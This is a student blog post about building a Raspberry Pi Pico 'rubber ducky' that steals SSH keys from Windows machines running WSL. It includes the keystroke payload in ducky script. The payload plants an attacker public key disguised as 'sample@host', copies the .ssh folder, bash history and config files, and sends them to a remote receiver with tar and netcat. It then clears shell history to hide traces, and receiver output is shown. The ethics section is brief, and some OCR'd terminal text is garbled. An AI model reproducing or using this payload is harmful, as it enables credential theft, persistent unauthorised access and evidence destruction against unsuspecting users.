---
title: Designing a SSH stealing rubber ducky
date: 2024-10-17
summary: Building a tool to steal ssh keys from unsuspecting UNSW students
tags: ["cybersecurity"]
---
**Github Link**: https://github.com/rahul-sharma-project/ssh_rubber_ducky 

**Video Example**: https://youtu.be/WF8u6rfgFls 

My project was centred around the usage of a rubber ducky with abusing the SSH utilities and the keys surrounding them. In this case, the rubber ducky is plugged into the machine and immediately opens WSL on a Windows machine, it will then create an opening for an attacker’s computer to SSH into the target machine then copies all the SSH keys that belong to the original WSL machine and closes itself. 

When I initially produced this idea, I wanted to do so through PowerShell and simply going after SSH keys only. 

However, I realised that there was lots of potential with WSL as executing a bunch of Linux commands with Linux utilities was signifcantly easier, so I turned my focus over to WSL instead. 

## Background – 3 hrs 

When considering what to do, I thought immediately of the potential behind SSH as the whole service surrounds authentication and encryption, so I had to think of a way to fake authentication. Recently I had been playing around with password-less logins using SSH and came into the idea of using private and public keys. A lot of UNSW students use this method to avoid having to enter in their passwords constantly so I thought stealing SSH keys with a rubber ducky could be a good idea for a rubber ducky as it emphasises the reliance on keeping your computer locked and those keys safe as if the wrong person gets them, they get access to all the things you have ssh’ed into. This idea took me about 3 hours to come up with as I was experimenting with other ideas in addition to this one. 

## What physical tool to use? – 3 hrs

First, I had to figure out mechanically what tool to use. At first, I was naïve and thought that I could use any old USB, but I realised I needed a specialised tool. With the pico-ducky framework and using a Raspberry Pi Pico, I realised I could efectively make a rubber ducky emulate a keyboard through giving it a hid library. It took me about three hours to come up with buying a Raspberry Pi Pico in the frst place and fnding all the required frmware to make it operate as a HID keyboard and to be able to write keystrokes for a payload. 

## Is it broken? - 1 hour

After initially receiving the Raspberry Pi Pico, I found a micro usb cable lying around and attempted to use it with my computer but to no avail! I was convinced that I had received a dud which was a bit upsetting however I realised that this problem may have to do with the fact that the cable is not a data cable. I ended up buying a new cable and it solved all my issues there. This issue genuinely took me so long to identify thatI spent an entire hour just scrolling through forums about this issue.

## Considering Hiding Traces -1 hour

I immediately had to then consider how would I go about hiding my traces and my original idea was to transfer the SSH files through `scp` instead. For hiding the traces, most Ubuntu shells use bash as their default shells and all history is stored in the `.bash_history` file so I was able to simply remove that file and all traces were hidden. Regarding tracing by `ssh`, by default `ssh` does not log connections so it should be safe on that front. I would then realise however that if I use `history-c && history-w` I can delete the local history, and I won't need to get rid of bash_history. This will make it less suspicious with the bash history suddenly disappearing for a user. It took me an hour to learn these bash commands and to utilise them in this fashion here and implement effectively.

`STRING \~/./sample.sh && history -c && history -w && exit`

## Issues with SCP – 6 hours

With SCP, a major issue with it is **authentication** as you need to type in a password and consider the time it would take for authentication, making the rubber ducky less efective as I wanted everything achieved through a single bash script. How I thought I could’ve solved this was generating a key pair and having the public key as an authorized key on my receiver server and enter in the public key to the target machine. However, one of the largest faws with this strategy is that the authorized keys require a host name to go along with it. The issue with that is to get the host name to my receiver I need to use ssh. I was in a paradox here. This held me back for about six hours as I tried experimenting constantly with copying my own private key and getting it to work until I noticed the stipulation regarding the public key on my machine containing the host information on it. 

## Solution with Netcat – 3 hours 

I realised that instead of SCP or focusing on writing a private key to my attacker’s computer, I will instead use netcat which while it is not encrypted, allows me to have authentication-less fle transfers available and hence, that is what I ended up going with for my fnal product. It took me three hours to get a functioning netcat transfer as the transfer would continuously fail due to how many fles I was sending. This is what spurred me to tar the fle as it is sent and untar on the receiver. 

## Planting a public key – 1 hour 

After deciding to use netcat, I realised that there was something I could still do with the private key pair I generated. I decided that I can echo the public key into the authorized keys of the target machine, giving my attacking machine full access to their WSL setup as my public key on their machine will match the private key stored on mine. So, this is what I ended up going with in the result. To fgure out how to get my public key over to the target machine and to come up with this command took me about an hour. 

## How do I know where to SSH – 1 hour 

The next issue comes after this which is how do I fgure out where to go to SSH if I am in the local network of the person I have just attacked. To solve this problem, I added a line of code which will give me the name of the user account and all their IP information. This lets me get their local IPv4 address to SSH into their computer on their account. I echo this all into a fle and then put it in the directory we will be sending over to the receiver. It took me an hour of just experimenting 

## Using a bash script – 3 hours

At frst, I typed each command line by line however something unexpected would occur. If the rubber ducky was being run on a slower machine or the size of the fles being taken are too large then there will be a delay between keystrokes, causing the commands being mistyped and it overall failing. Instead, I load everything into a bash script so that I can just unplug the rubber ducky straight away after the text editor closes opposed to having to wait for each command to execute. I kept experimenting with trying to make the commands type faster for three hours and to add delays however nothing worked. It was then I decided that a bash script would be much more eficient here. 

## Making the receiver and port forwarding it – 5 hours

Next issue is with how I handle the receiver. Considering that the live test for this will be 

done on university campus, I needed a method of accessing my server outside. Normally with my server, I either access it internally through a VPN or alternatively, I use Cloudfare Zero Trust to make custom domains to access my web applications. I attempted to use Zero Trust to make a custom domain to access my server, but I realised that there was too much authentication involved with setting up a simple SSH domain transfer. Instead, I opted to directly port forward my netcat receiver on my router so I can just enter my DHCP IP address at the time as the destination for my netcat receiver at my specifed port. To avoid myself being pwned, I made sure to shut down the local containerized virtual machine running the receiver and only have it access when using the rubber ducky. (This port is closed after the presentation so don’t test it cheers). It may be hard to believe this took fve hours due to having to make the container that holds the receiver and setting up networking. However Optus routers are dreadful when applying port forwarding rules. For some reason, when connected locally, Optus fags my own personal DNS as suspicious which is absurd considering I turned of those settings. This could have been done a lot faster if it was on a diferent platform but I got it functioning. 


![](https://web-api.textin.com/ocr_image/external/62f3b0338d938fc1.jpg)

## Run-Through of the Final Execution

To give a more detailed explanation of the final product, we start by running the “Run” shell command for windows as it allows us to instantly access any application while always running on top, preventing anything else from being impacted.

We will then write “Ubuntu” which is the default WSL distribution and likely to be the OS used by the target machine. We must wait for ubuntu to open so we wait for 1 second before typing our commands.


| GUI r  |
| -- |
| DELAY 250  |
| STRING ubuntu  |
| DELAY 250  |
| ENTER  |
| DELAY 1000  |


I made sure that all the commands will be accessible no matter where you may start the bash shell from. So, you could start in a different directory and the commands will still run. I will first open a text editor pre-installed on all Ubuntu distributions to make a shell script to enter all my commands into and have the first command delete the shell script immediately so there is no trace. This lets me remove the USB faster and not have to wait for slow transfer speeds. We need to create the “authorized_keys” file in the.ssh directory as this will allow us to add in our public key for my attacking machine. This will enable me to access the target machine at any time as if I ssh in, it will match my attacking private key with an authorized public key.

STRING cd && nano sample.sh

ENTER

STRING rm \~/sample.sh

ENTER

STRING touch\~/.ssh/authorized_keys

ENTER

STRING echo ssh-ed25519 AAAAC3NzaC11Z

ENTER

At this point, our first part of the attack is complete. I would also note that the ssh key that I put in the authorized_keys has the user account “sample” and the host name “host” so that even if someone does check the authorized keys,they wil think it is just a default/ sample ssh key and may disregard it, adding a layer of social engineering.


| STRING echo ssh-ed25519 AAAAC3NzaC11ZD1 zUdBRdW3WnocUz+5FON8We9UITO sample@host |  WNTE5AAAAIDJz+uLagY7SoQbW/&gt;&gt;\~/.ssh/authorized_keys |
| -- | -- |
| ENTER  | ENTER  |


The second component of the attack is a bit different, here first think we do is make a copy of their.ssh directory in their root directory called something innocuous like "temp_dir” in this case so that if there is an interruption or failure at any point,it will not look too suspicious having the temp_dir directory in the root. Not only am I also going to steal them.ssh folder, I will take their bash history so I can see where they may frequently ssh into and their gitconfig to see if there are any alia ses they may have set up in the configuration. I'll also take their .bashrc to see if there are any ssh aliases stored in there at all. You also may notice the whoami and ip a. This is to obtain the user account and the name of the ip address of where the system is located.

<!-- STRING cp -r \~/.ssh \~/temp_dir ENTER STRING cp \~/.bash_history \~/temp_dir ENTER STRING cp \~/.gitconfig \~/temp_dir ENTER STRING cp \~/.bashrc \~/temp_dir ENTER STRING (whoami && ip a) &gt;&gt; \~/temp_dir/.details ENTER  -->
![](https://web-api.textin.com/ocr_image/external/18bb10dbb8cb3ca6.jpg)

We will then use netcat to send the .ssh directory over to my receiver and promptly delete the temp_dir to hide any traces. To try hide my traces even further,I will clear the local history of the session and delete the local history of the terminal so that there is no trace of any tampering whatsoever.

STRING tar cf - \~/temp_dir | nc 192.168.0.3 30000

ENTER

STRING rm -rf \~/temp dir

After this we will then save the file using nano commands, make it executable then run the program.However, after this, we will need to also clear the local history so there is no trace and then exit the Ubuntu terminal.

CTRL x

y

ENTER

STRING chmod +x \~/sample.sh

ENTER

STRING \~/./sample.sh && history -c && history -w && exit

ENTER

Below is the output from the receiver terminal side (which is on my server)

Welcome to Ubuntu 23.04 (GNU/Linux 5.15.108-1-pve x86_64)

* Documentation: https://help.ubuntu.com

*Management: httpa://landscape.canonical.com

* Support: httpa://ubuntu.com/advantage

Last login: Tue Oct 29 07:32:04 UTC 2024 on tty1

sample@hoat:\~&#36; 1a

sample@host:\~&#36; nc -1 30000 | tar x

aample@host:\~&#36;1a

home

sample@host:\~&#36; cd home

aample@hoat:\~/home&#36; 1a

rahul

sample@host:\~/home&#36; cd rahul/

sample@host:\~/home/rahul&#36; 1s

temp_dir

sample@hoat:\~/home/rahul&#36; cd temp_dir/

sample@host:\~/home/rahul/temp_dir&#36; 1s

authorized_keya id_ed25519 id_ed25519.pub known_hoata known_hoats.old

sample@host:\~/home/rahul/temp_dir&#36;


![](https://web-api.textin.com/ocr_image/external/25ef5a45143c8f40.jpg)

We can see the directory starts off empty with nothing inside and then we run a netcat command.This opens our receiver at port 30000 and receives the tarball and untars it so that all the files are now accessible on the receiver. Also, a question might be why don't I copy the .ssh directly? Well, if I do that, then it will overwrite the .ssh file in the receiver which breaks a lot of my stuff. I've also got it making a new home folder to sort out victims easier so I can steal multiple keys at once. The program automatically terminates after receiving the files so that no other people can access it afterwards and we can have all the SSH keys fully available there.
```

> sample@host: 1s
> sample@host: nc -1 30000 | tar x

sample@hoat:\~&#36; 13

home

sample@hoat:\~&#36; cd home

sample@hoat:\~/home&#36; 1a

rahul

aample@host:\~/home&#36; cd rahul/

aample@hoat:\~/home/rahul&#36; 1a

temp_dir

sample@hoat:\~/home/rahul&#36; cd temp_dir/

aample@hoat:\~/home/rahul/temp_dir&#36; 1s

authorized_keya id_ed25519 id_ed25519.pub known_hosta known_hosts.old

sample@hoat:\~/home/rahul/temp_dir&#36;

host login: sample

Password:

Welcome to Ubuntu 23.04 (GNU/Linux 5.15.108-1-p

* Documentation: https://help.ubuntu.com

*Management: https://landscape.canonical.

* Support: https://ubuntu.com/advantage

Last login: Sun Oct 27 05:33:52 UTC 2024 from 19

sample@host:\~&#36;

sample@host:\~ nc -1 30000 | tar x
```

## Strengths and Weaknesses of this implementation

One of the greatest strengths for this implementation would defnitely be its speed as it is able to execute everything and steal all of your stuf in just a few seconds. It also hides its traces so that there is no way of someone even fguring out that they have had their data stolen from them! It is also small as the PCB can be easily disguised and plugged into a computer quickly and unplugged in a matter of seconds. 

It's disadvantage however is that it assumes the target is on a Windows machine using WSL Ubuntu. If we were to plug it into a Mac or Linux machine it would not function as intended. It also expects the user to be using the bash shell however if we were to plug it into the zsh shell, there may be some failure with some of the commands such as hiding the history. We will have to make each USB specifc for an operating system for it to function efectively otherwise it will not operate as intended. 

## Conclusion and the ethics behind this project

This tool that I have created is ridiculously powerful. In terms of speed, it can emulate a keyboard and be plugged into any platform of device to execute the keyboard commands instantly as it connects. With a few simple modifcations, I could make this efectively work on CSE machines and when people leave them unattended, I could gain access to their accounts. It’s even easier too since CSE machines can be accessed anywhere. This is obviously a huge ethical concern as being able to take over someone’s unattended CSE machine is a scary prospect. This project was a success in what it was trying to achieve but it also revealed to me how leaving your technology unattended could lead to dire consequences when it comes to security, so you should always be careful about who is around and if you are going to leave your computer unattended, LOCK IT. 

This task was challenging to do in that I had to be pretty creative with how I optimised the commands to ft in the fewest lines possible. I also had to fgure out how SSH worked on a much deeper level to fgure out how I can abuse the SSH daemon on Linux to break into computers. I also had to fgure out an avenue of attack that was efective so getting a functioning rubber ducky was dificult in itself as I never really mechanically played around with physical hardware but once I got used to it, it was a pleasure to work with. My rubber ducky worked so efectively, it even ended up destroying my personal computer (don’t worry, nothing of value was lost. I had to reinstall Linux)! I am glad I got to try this and it has defnitely made me more aware of the importance behind physical security on your computer. 

## REFERENCES

https://github.com/dbisu/pico-ducky 

5574955 | Rahul Sharma 

https://www.cyberciti.biz/faq/clear-the-shell-history-in-ubuntu-linux/ 

https://stackoverfow.com/questions/19306771/how-do-i-get-the-current-users-username-in-bash 

https://security.stackexchange.com/questions/109260/what-is-the-beneft-of-an-ssh-tunnel-vs-a-netcat-shell-for-remote-communication 

